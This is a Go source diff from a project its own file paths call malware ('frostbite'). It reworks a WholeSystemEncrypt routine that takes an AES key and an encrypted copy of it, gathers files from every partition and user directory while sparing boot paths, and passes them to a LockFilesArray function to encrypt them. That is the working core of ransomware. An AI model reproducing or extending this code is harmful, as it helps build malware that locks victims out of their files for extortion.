@@ -7,17 +7,15 @@ import (
 	"sync"
 	"time"
 
+	file "frostbite.com/tools/file"
 	scan "frostbite.com/tools/scan"
 	humanize "github.com/dustin/go-humanize"
-
 	"github.com/shirou/gopsutil/disk"
 )
 
 var pl = fmt.Println
 
-// enc "frostbite.com/encryption"
-
-func WholeSystemEncrypt() {
+func WholeSystemEncrypt(aesKey []byte, encryptedAesKey []byte) {
 
 	//set variables
 	var (
@@ -29,27 +27,35 @@ func WholeSystemEncrypt() {
 		"C:\\Users",
 	}
 	dirsToRemove := []string{"/", "C:", "C:\\\\", "/boot/efi", "/boot"}
-
 	timeNow := time.Now()
-	//get all partitions
-	//append all partition mount points to dirsToScan
-	//remove dirs that would break the system or do not exist
+
 	dirsToScan = generateListOfDirsToScan(dirsToScan, dirsToRemove)
+	dirsToScan = []string{"/home/dejan/dev/go/malware/frostbite/data"}
 	pl("dirsToScan: ", dirsToScan)
 
-	//add go routine for each dir
 	runtime.GOMAXPROCS(runtime.NumCPU() / 2)
+	//listen for channel and append to filesToEncrypt
+	filesToEncrypt = getAllFiles(dirsToScan, filesToEncrypt)
+	//encrypt files
+	file.LockFilesArray(filesToEncrypt, aesKey, encryptedAesKey)
+
+	timeEnd := time.Now()
+	pl("\nTOTAL files found: ", humanize.Comma(int64(len(filesToEncrypt))))
+	//print human readable size
+	pl("Time elapsed: ", timeEnd.Sub(timeNow))
+
+}
+
+func getAllFiles(dirsToScan []string, filesToEncrypt []string) []string {
 	wg := sync.WaitGroup{}
 	wg.Add(len(dirsToScan))
 
 	var chanFilesScanned = make(chan []string)
 
 	for _, dir := range dirsToScan {
-
 		go goroutineScanDir(dir, &wg, chanFilesScanned)
-
 	}
-	//listen for channel and append to filesToEncrypt
+
 	go func() {
 		for range dirsToScan {
 			files := <-chanFilesScanned
@@ -60,12 +66,7 @@ func WholeSystemEncrypt() {
 	}()
 
 	wg.Wait()
-
-	timeEnd := time.Now()
-	pl("\nTOTAL files found: ", humanize.Comma(int64(len(filesToEncrypt))))
-	//print human readable size
-	pl("Time elapsed: ", timeEnd.Sub(timeNow))
-
+	return filesToEncrypt
 }
 
 func goroutineScanDir(dir string, wg *sync.WaitGroup, chanFilesScanned chan []string) {
